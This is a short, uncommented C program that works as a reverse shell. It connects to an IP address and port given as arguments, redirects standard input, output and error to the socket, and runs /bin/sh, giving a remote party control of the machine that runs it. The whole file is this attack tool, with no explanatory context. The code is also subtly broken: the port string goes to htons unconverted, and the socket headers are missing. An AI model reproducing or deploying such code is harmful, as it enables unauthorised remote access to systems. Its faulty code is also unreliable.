#include <stdio.h>

int main (int c, char **v) {
	char *ex[4];
	struct sockaddr_in s4;
	int s;
	s4.sin_family = AF_INET;
	s4.sin_port = htons(v[2]);
	s4.sin_addr.s_addr = inet_addr(v[1]);
	s = socket(AF_INET, SOCK_STREAM, 0);
	connect(s, (struct sockaddr_in *)&s4,sizeof(struct sockaddr_in));
	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);
	ex[0]="/bin/sh";
	ex[1]="sh";
	ex[2]=NULL;
	execve(ex[0],&ex[1],NULL);
}
